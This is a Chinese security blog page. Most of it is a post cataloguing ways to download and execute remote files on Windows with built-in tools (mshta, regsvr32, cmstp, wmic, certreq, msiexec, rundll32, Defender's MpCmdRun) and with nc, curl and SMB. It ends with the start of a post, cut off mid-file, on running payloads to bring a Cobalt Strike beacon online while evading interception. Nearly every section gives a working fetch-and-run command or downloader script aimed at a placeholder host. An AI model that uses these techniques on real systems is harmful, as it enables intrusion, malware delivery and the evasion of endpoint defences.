<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo downfile.vbs http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\temp\1.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821100115562.png" alt="image-20200821100115562"></p>
<p>​        甚至也可以使用cmd先写入vbs文件，最后再调用vbs执行下载功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo set a&#x3D;createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w&#x3D;createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt;downfile.vbs</span><br></pre></td></tr></table></figure>

<p><strong>方法二：</strong></p>
<p>​        还可以使用其他的下载vbs脚本文件执行下载功能，文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">strFileURL &#x3D; &quot;http:&#x2F;&#x2F;119.xxx.xxx.xxx&#x2F;1.txt&quot;</span><br><span class="line">strHDLocation &#x3D; &quot;1.txt&quot;</span><br><span class="line">Set objXMLHTTP &#x3D; CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line">objXMLHTTP.open &quot;GET&quot;, strFileURL, false</span><br><span class="line">objXMLHTTP.send()</span><br><span class="line">If objXMLHTTP.Status &#x3D; 200 Then</span><br><span class="line">Set objADOStream &#x3D; CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type &#x3D; 1</span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody</span><br><span class="line">objADOStream.Position &#x3D; 0</span><br><span class="line">Set objFSO &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation</span><br><span class="line">Set objFSO &#x3D; Nothing</span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line">objADOStream.Close</span><br><span class="line">Set objADOStream &#x3D; Nothing</span><br><span class="line">End if</span><br><span class="line">Set objXMLHTTP &#x3D; Nothing</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821104803291.png" alt="image-20200821104803291"></p>
<h4 id="js"><a href="#js" class="headerlink" title="js"></a>js</h4><p><strong>方法一：</strong></p>
<p>​        首先准备一个js文件，文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var objArgs &#x3D; WScript.Arguments;var sGet&#x3D;new ActiveXObject(&quot;ADODB.Stream&quot;);var xGet &#x3D; false;</span><br><span class="line">try &#123;</span><br><span class="line">xGet &#x3D; new XMLHttpRequest();</span><br><span class="line">&#125; </span><br><span class="line">catch (trymicrosoft) &#123;</span><br><span class="line">try &#123;</span><br><span class="line">    xGet &#x3D; new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);</span><br><span class="line">&#125; </span><br><span class="line">catch (othermicrosoft) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      xGet &#x3D; new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    &#125; </span><br><span class="line">catch (failed) &#123;</span><br><span class="line">      xGet &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">xGet.Open (&quot;GET&quot;,objArgs(0).toLowerCase(),0);xGet.Send();sGet.Mode&#x3D;3;sGet.Type&#x3D;1;sGet.Open();sGet.Write (xGet.ResponseBody);sGet.SaveToFile (objArgs(1).toLowerCase(),2);</span><br></pre></td></tr></table></figure>

<p>​        通过cscript调用该文件执行下载操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo down.js http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\temp\test123123.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821105402895.png" alt="image-20200821105402895"></p>
<p><strong>方法二：</strong></p>
<p>​        准备一个js文件，文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">BinStream &#x3D; new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type &#x3D; 1;</span><br><span class="line">BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(&quot;test12312223123.txt&quot;);</span><br></pre></td></tr></table></figure>

<p>​        执行如下命令进行下载文件操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo down2.js http:&#x2F;&#x2F;xxx:801&#x2F;1.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821110118839.png" alt="image-20200821110118839"></p>
<p><strong>注意</strong></p>
<p>​        方法二这种文件下载方式有一些缺点，首先不能指定绝对路径，否则会写入失败，另外，文件名也不能和系统在该目录下已有的文件名冲突，否则也会写入失败。</p>
<h4 id="certreq"><a href="#certreq" class="headerlink" title="certreq"></a>certreq</h4><p>​        在 Windows Server 2008 R2 上提供了 Microsoft certreq 实用程序，可使用该实用程序生成 CSR 和导入签名证书。下载命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertReq -Post -config http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\win.ini c:\windows\temp\output.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821110958332.png" alt="image-20200821110958332"></p>
<p>​        这个程序虽然可以下载任意形式的文件，但是又有两个限制，第一个限制就是在serever 2008 r2以上的系统。第二个就是长度限制，不能下载超过60k的文件。这种文件下载的方式如果文件存在也会报错，因此使用这种方式下载文件，文件名不能和已有的文件名相同。</p>
<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;from urllib import urlretrieve; urlretrieve(&#39;http:&#x2F;&#x2F;xxx:801&#x2F;1.txt&#39;, &#39;C:\\Windows\\Temp\\test8866.txt&#39;)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821114745482.png" alt="image-20200821114745482"></p>
<h4 id="Defender"><a href="#Defender" class="headerlink" title="Defender"></a>Defender</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2008.9-0\\MpCmdRun.exe&quot; -DownloadFile -URL http:&#x2F;&#x2F;xxxx:8888&#x2F;dnsClient.zip -path C:\\Users\\admin\\Desktop\\test666.zip</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200903134638844.png" alt="image-20200903134638844"></p>
<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200903134655822.png" alt="image-20200903134655822"></p>
<h3 id="下载指定格式文件"><a href="#下载指定格式文件" class="headerlink" title="下载指定格式文件"></a>下载指定格式文件</h3><h4 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h4><p>​        使用msiexec可以下载并执行msi文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;xxxx:8011&#x2F;test666.msi</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821134222982.png" alt="image-20200821134222982"></p>
<h4 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h4><p>​        mshta可以远程加载hta文件并执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:801&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821134354798.png" alt="image-20200821134354798"></p>
<h4 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h4><p>​        使用regsvr32可以远程加载并执行sct文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;xxx:8011&#x2F;test8866.sct scrobj.dll</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821135750174.png" alt="image-20200821135750174"></p>
<h4 id="CMSTP"><a href="#CMSTP" class="headerlink" title="CMSTP"></a>CMSTP</h4><p>​    使用cmstp加载本地的inf文件，inf中再去加载远程的sct文件。</p>
<p>inf中的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature&#x3D;$chicago$</span><br><span class="line">AdvancedINF&#x3D;2.5</span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">UnRegisterOCXs&#x3D;UnRegisterOCXSection</span><br><span class="line">[UnRegisterOCXSection]</span><br><span class="line">%11%\scrobj.dll,NI,http:&#x2F;&#x2F;10.0.0.2&#x2F;tmp&#x2F;powersct.sct</span><br><span class="line">[Strings]</span><br><span class="line">AppAct &#x3D; &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName&#x3D;&quot;Pentestlab&quot;</span><br><span class="line">ShortSvcName&#x3D;&quot;Pentestlab&quot;</span><br></pre></td></tr></table></figure>

<p>​        再使用如下命令加载inf文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe &#x2F;s xxx.inf</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821140228440.png" alt="image-20200821140228440"></p>
<p>​        使用这种方式加载并执行远程的文件有个缺陷，就是会在执行的目录下生成一个快捷方式文件还有一个cmp文件。</p>
<h4 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h4><p>​        使用wmic可以加载并执行远程的xsl文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process get brief &#x2F;format:&quot;http:&#x2F;&#x2F;xxx:8080&#x2F;launcher.xsl&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821140727620.png" alt="image-20200821140727620"></p>
<h4 id="WCS"><a href="#WCS" class="headerlink" title="WCS"></a>WCS</h4><p>​        首先创建一个js文件，文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(&quot;script:http:&#x2F;&#x2F;xxxx:8011&#x2F;test.wsc&quot;);</span><br></pre></td></tr></table></figure>

<p>​        使用cscript执行js文件，加载并执行远程的wsc文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csript  1.js</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821141107404.png" alt="image-20200821141107404"></p>
<p>​        wsc文件中的内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;    </span><br><span class="line">&lt;package&gt;</span><br><span class="line">&lt;component id&#x3D;&quot;testCalc&quot;&gt;    </span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;    </span><br><span class="line">&lt;&#x2F;component&gt;</span><br><span class="line">&lt;&#x2F;package&gt;</span><br></pre></td></tr></table></figure>

<h4 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h4><p>​        rundll32本身并不能达到加载并且运行远程文件的目的，不过可以配合其他方式来下载远程文件并执行</p>
<p>比如可以加载hta文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;C:&#x2F;Windows&#x2F;System32&#x2F;mshta.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.hta&quot;,0,true);self.close();</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821141739314.png" alt="image-20200821141739314"></p>
<h3 id="非自带程序"><a href="#非自带程序" class="headerlink" title="非自带程序"></a>非自带程序</h3><h4 id="msxsl"><a href="#msxsl" class="headerlink" title="msxsl"></a>msxsl</h4><p>​        msxsl.exe可以去加载远程的xsl文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.xsl  http:&#x2F;&#x2F;xx.xxx.xx.xx:8011&#x2F;test.xsl</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821142928346.png" alt="image-20200821142928346"></p>
<p>​        xsl文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">	&lt;ms:script implements-prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br></pre></td></tr></table></figure>

<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>​        首先在自己的服务端执行如下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444 &lt; evil.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821145912928.png" alt="image-20200821145912928"></p>
<p>​        在客户端执行下面的命令进行文件下载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  xxxxx 4444 &gt;evil.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821150020632.png" alt="image-20200821150020632"></p>
<h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>​        有些主机上安装了curl，因此也可以使用curl进行文件下载操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;xxx:1234&#x2F;evil.exe -o test123123.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821150327583.png" alt="image-20200821150327583"></p>
<h4 id="chfs"><a href="#chfs" class="headerlink" title="chfs"></a>chfs</h4><p>​        这款工具可以在主机上开启一个web服务，我们可以通过这个web服务对主机上的文件进行增删改查，这个方式比较适合在内网去使用。</p>
<p>​        上传到目标主机，在某个目录下执行这个文件，即可将当前目录共享出去</p>
<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821155948134.png" alt="image-20200821155948134"></p>
<p>​        在web下访问，即可对目录下的文件进行操作。</p>
<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821160044054.png" alt="image-20200821160044054"></p>
<h3 id="SMB协议下载"><a href="#SMB协议下载" class="headerlink" title="SMB协议下载"></a>SMB协议下载</h3><h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\jerry\Desktop\test666.inf \\192.168.3.144\c$\windows\temp\</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821164751755.png" alt="image-20200821164751755"></p>
<h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p>​        使用这种方式可以在本地加载远程的文件执行 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;k \\192.168.3.144\c$\windows\temp\calc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821165453771.png" alt="image-20200821165453771"></p>
<h4 id="cscript"><a href="#cscript" class="headerlink" title="cscript"></a>cscript</h4><p>​        使用这种方式可以加载远程的js并且执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript  \\192.168.3.144\c$\windows\temp\test.js</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821170207437.png" alt="image-20200821170207437"></p>
<h4 id="Odbcconf"><a href="#Odbcconf" class="headerlink" title="Odbcconf"></a>Odbcconf</h4><p>​        使用这种方式可以加载远程的dll进行执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odbcconf.exe &#x2F;a &#123;regsvr \\192.168.3.144\c$\windows\temp\test.dll&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821172655915.png" alt="image-20200821172655915"></p>
<p>​        需要注意编译的dll的版本要和windows的版本相对应。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        关于windows下文件下载的方式先总结这么多，这些文件下载方式的种类虽然非常多，还是要选择适合自己当前环境的方式来选择对应的方法利用。</p>
<p><strong>参考文章</strong></p>
<p><a href="https://evi1cg.me/archives/remote_exec.html" target="_blank" rel="noopener">windows命令执行漏洞不会玩？ 看我！</a></p>
<p><a href="https://payloads.online/archivers/2017-11-08/1#0x02-ipc" target="_blank" rel="noopener">Windows下命令行下载文件总结</a></p>
<p><a href="https://xz.aliyun.com/t/7937#toc-3" target="_blank" rel="noopener">windows/Linux文件下载方式汇总</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于windows执行shellcode的方式学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-08-06 20:07:45" itemprop="dateCreated datePublished" datetime="2020-08-06T20:07:45+08:00">2020-08-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-08-28 16:09:14" itemprop="dateModified" datetime="2020-08-28T16:09:14+08:00">2020-08-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有时候我们想让目标执行我们的程序上线CS,但是直接调用CMD去执行exe是会被拦截的，遇到这种情况有什么方法可以执行我们的程序。</span><br></pre></td></tr></table></figure>

<h3 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h3><p><strong>Regsvr32是什么？</strong></p>
<p> Regsvr32命令用来向系统注册控件或者卸载控件的命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">语法：Regsvr32 [&#x2F;s][&#x2F;u] [&#x2F;n] [&#x2F;i[:cmdline]] &lt;dllname&gt;</span><br><span class="line">· &#x2F;u：注销服务器；</span><br><span class="line">· &#x2F;i：调用DllInstall传递一个可选的[cmdline]，当它与&#x2F;u一起使用时，它会调用dll uninstall。</span><br><span class="line">· &#x2F;n：不要调用DllRegisterServer，此选项必须与&#x2F;i一起使用</span><br><span class="line">· &#x2F; s ：沉默，不显示消息框；</span><br></pre></td></tr></table></figure>

<p><strong>如何使用regsvr32执行exe？</strong></p>
<p> 首先准备一个sct文件放到服务器上,文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line"></span><br><span class="line">&lt;registration</span><br><span class="line">    description&#x3D;&quot;Empire&quot;</span><br><span class="line">    progid&#x3D;&quot;Empire&quot;</span><br><span class="line">    version&#x3D;&quot;1.00&quot;</span><br><span class="line">    classid&#x3D;&quot;&#123;20001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span><br><span class="line">	&gt;</span><br><span class="line">	&lt;!-- regsvr32 &#x2F;s &#x2F;i&quot;C:\Bypass\Backdoor.sct&quot; scrobj.dll --&gt;</span><br><span class="line">	&lt;!-- regsvr32 &#x2F;s &#x2F;i:http:&#x2F;&#x2F;server&#x2F;Backdoor.sct scrobj.dll --&gt;</span><br><span class="line">	&lt;!-- That should work over a proxy and SSL&#x2F;TLS... --&gt;</span><br><span class="line">	&lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;</span><br><span class="line">	&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">		&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line">			var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);	</span><br><span 